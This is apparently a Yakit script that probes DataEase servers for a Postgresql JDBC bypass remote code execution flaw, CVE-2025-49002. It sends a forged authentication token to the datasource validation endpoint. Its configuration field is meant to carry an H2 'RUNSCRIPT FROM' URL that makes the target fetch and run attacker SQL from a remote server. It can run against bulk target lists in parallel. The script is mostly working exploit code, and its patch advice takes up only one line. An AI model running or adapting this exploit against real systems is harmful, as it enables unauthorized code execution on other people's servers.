script_name: 飞致云 DataEase Postgresql JDBC Bypass 远程代码执行漏洞
content:
yakit.AutoInitYakit()
log.setLevel("info")

handleCheck = func(addr, MalAddr) {
    isTls = str.IsTLSServer(addr)
    pac = `POST /de2api/datasource/validate HTTP/1.1
Host: {{params(target)}}
Accept-Encoding: gzip, deflate, br, zstd
sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
X-DE-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MX0.a5QYOfZDYlhAy-zUMYzKBBvCUs1ogZhjwKV5SBTECt8
Accept-Language: zh-CN
Sec-Fetch-Dest: empty
sec-ch-ua-mobile: ?0
Sec-Fetch-Site: same-origin
sec-ch-ua-platform: "Windows"
Content-Type: application/json
Sec-Fetch-Mode: cors
Content-Length: 821

{
    "id": "",
    "name": "11",
    "description": "",
    "type": "h2",
    "apiConfiguration": [],
    "paramsConfiguration": [],
    "enableDataFill": false,
    "configuration": "{{params(MalAddr)}}"
}`
    rsp, req, _ = poc.HTTP(pac, poc.params({"target": addr, "MalAddr": MalAddr}), poc.https(isTls), poc.redirectTimes(3), poc.connectTimeout(2))
    if str.MatchAllOfSubString(rsp, `HTTP/1.1 200`)&& str.Contains(rsp, "Content-Length:") && len(rsp) >0 && !str.Contains(rsp, "Error"){
        yakit.Info("飞致云 DataEase Postgresql JDBC Bypass 远程代码执行漏洞", addr)
        risk.NewRisk(
            addr,
            risk.title("飞致云 DataEase Postgresql JDBC Bypass 远程代码执行漏洞"),
            risk.severity("high"),
            risk.titleVerbose("飞致云 DataEase Postgresql JDBC Bypass 远程代码执行漏洞"),
            risk.type('rce'),
            risk.request(string(req)),
            risk.response(string(rsp)),
            risk.description("飞致云 DataEase 存在 Postgresql JDBC Bypass 远程代码执行漏洞，攻击者可通过构造恶意请求执行任意代码。"),
            risk.solution("升级飞致云 DataEase 至最新版本或应用官方补丁。"),
            risk.cve("CVE-2025-49002"),
        )
    }
    return
}

target = cli.String("Target", cli.setRequired(false))
cli.check()
MalAddr = cli.String("MalAddr",
    cli.setRequired(false),
    cli.setDefault(""),
    cli.setHelp("指定恶意 SQL 文件的地址。默认值为 Base64 编码的字符串，请解码后替换为实际的恶意 SQL 文件地址，例如：RUNSCRIPT FROM 'http://your-vps:2333/poc.sql'")
)

iptables = cli.LineDict("Targets", cli.setRequired(false))
cli.check()

run = func(iptables) {
    t = 0
    swg := sync.NewSizedWaitGroup(100)
    m = sync.NewMutex()
    for _, ip := range iptables {
        ip, port, _ := str.ParseStringToHostPort(ip)
        addr := str.HostPort(ip, port)
        swg.Add(1)
        go func(addr) {
            defer swg.Done()
            handleCheck(addr, MalAddr)
            m.Lock()
            defer m.Unlock()
            t++
        }(addr)
    }
    swg.Wait()
    return t
}

if target {
    ip, port, _ = str.ParseStringToHostPort(target)
    addr = str.HostPort(ip, port)
    handleCheck(addr, MalAddr)
}

if iptables {
    k = run(iptables)
    yakit.Info("目标总数: %v", k)
}
